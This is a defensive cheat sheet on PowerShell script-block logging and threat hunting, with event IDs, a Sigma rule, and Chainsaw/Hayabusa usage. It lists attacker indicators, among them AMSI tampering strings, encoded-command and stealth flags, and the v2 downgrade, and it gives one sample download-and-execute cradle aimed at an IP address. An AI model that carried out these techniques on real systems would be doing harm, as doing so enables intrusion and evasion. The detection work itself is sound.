# Cheat sheet — PowerShell Logging & Hunting

*Companion to [Module 13 — PowerShell Logging & Hunting](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

## The three channels — and what each captures

| Event ID | Channel | Captures |
|----------|---------|----------|
| **4103** | Module logging | Pipeline execution — cmdlets and their bound parameters |
| **4104** | **Script Block Logging** | The **deobfuscated** script text as PowerShell compiled it — the crown jewel |
| — | Transcription | Console-style input/output written to disk (human-readable session) |

`4103` = *what cmdlets ran* · `4104` = *what code actually executed* · transcription = *what the session looked like*.

## Turn it on (before the incident — you can't log retroactively)

```powershell
# Registry path for Script Block Logging (also settable via GPO):
# HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
  -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
```

Events land in **Microsoft-Windows-PowerShell/Operational**. Verify it actually fires after enabling.

## Read 4104 records

```powershell
# The field you hunt is ScriptBlockText
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Where-Object Id -eq 4104 |
  ForEach-Object { $_.Properties[2].Value }        # ScriptBlockText

# From an EVTX export:
Get-WinEvent -Path .\PowerShell.evtx -FilterXPath "*[System[EventID=4104]]"
```

## The indicator vocabulary (pattern-match on ScriptBlockText)

```
DownloadString | DownloadFile | Invoke-WebRequest | Net.WebClient   # remote fetch
IEX | Invoke-Expression                                             # in-memory execution
FromBase64String | -enc | -EncodedCommand                          # embedded payloads
amsiInitFailed | AmsiUtils                                          # AMSI tampering
[char]NN + [char]NN + ...                                           # obfuscation (char chains)
-Version 2 | -v 2                                                   # v2 DOWNGRADE — alert on this
-nop | -noni | -w hidden | -ep bypass                              # stealth flags
```

## Sigma over 4104

```yaml
logsource:
  product: windows
  category: ps_script                 # PowerShell script-block (4104)
detection:
  selection:
    ScriptBlockText|contains:
      - 'DownloadString'
      - 'IEX'
  filter_internal:
    ScriptBlockText|contains: 'http://intranet.corp'   # tune out benign admin
  condition: selection and not filter_internal
level: high
```

## Scale it — run Sigma over EVTX at speed

```bash
# Chainsaw — hunt Sigma rules across EVTX
chainsaw hunt Logs/ -s sigma/ --mapping mappings/sigma-event-logs-all.yml

# Hayabusa — fast Windows event-log timeline + built-in detections
hayabusa csv-timeline -d ./evtx -o timeline.csv
```

## Gotchas worth remembering

- **4104 defeats obfuscation because it logs the *compiled* script.** Base64 and `[char]` chains are already decoded/rebuilt in `ScriptBlockText` — a network IDS or 4103 sees the wrapper; 4104 sees the payload.
- **None of it is on by default at the level you need, and you can't log retroactively.** A hunt on a host where logging was never enabled is already lost — the only fix is turning it on *before* the incident.
- **PowerShell v2 downgrade is an evasion, not a curiosity.** v2 predates script-block logging, so `-Version 2` is itself an alertable event.
- **The false positive *is* the skill.** Admins download files and run encoded commands too. A patch script pulling an MSI from an *internal* host to disk is not `IEX (DownloadString('http://1.2.3.4/a'))`. Context — internal vs. external, disk vs. memory, who and where — is what you own.
- **A rule that flags every `DownloadString` is an alert cannon.** Run any drafted rule against the real sample and confirm it fires on the malicious blocks *and not* on the benign admin download.
- **Hunt by hand first to learn the fields, then graduate to Chainsaw/Hayabusa.** Running Sigma at scale is only trustworthy once your hand-hunt logic is sound.
